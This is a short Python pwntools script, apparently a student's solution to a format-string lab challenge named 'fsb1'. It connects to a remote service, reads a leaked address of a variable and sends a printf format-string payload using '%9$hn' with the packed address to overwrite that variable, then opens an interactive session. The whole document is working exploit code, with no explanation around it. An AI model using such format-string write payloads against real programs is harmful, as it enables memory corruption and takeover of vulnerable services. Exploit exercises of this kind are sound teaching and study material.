from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

DEBUG = 1
REMOTE = 1

if REMOTE:
    p = remote("8.154.20.109", 10300)
    p.recvuntil(b"Please input your StudentID:\n")
    p.sendline(b"3220103784")
else:
    p = process("./fsb1")
    
p.recvuntil(b'address of x is: ')
x_addr = eval(p.recvline().strip().decode())

log.success("get address successfully: x_addr = %x", x_addr)

# write x_addr to the 9th parameter of printf
payload = ""
payload += "%{}c%{}$hn".format(1, 9) # 9 is the index of x_addr in the stack
payload = payload.encode().ljust(8, b'0') # padding
payload += p64(x_addr) # the address of x

p.sendline(payload)
p.interactive()
